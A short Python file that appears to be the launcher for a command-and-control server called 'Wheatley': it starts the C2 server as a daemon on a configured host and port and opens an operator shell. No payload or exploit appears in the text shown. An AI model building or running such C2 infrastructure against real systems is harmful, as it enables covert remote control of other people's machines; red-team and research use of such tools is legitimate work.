from c2.constants import WHEATLY_C2_PORT, WHEATLY_C2_HOST
from c2.network.server import WheatleyServer
from c2.shell import WheatleyServerShell


def start():
    server = WheatleyServer(WHEATLY_C2_HOST, WHEATLY_C2_PORT)
    server.start_daemon()
    WheatleyServerShell(server).launch()
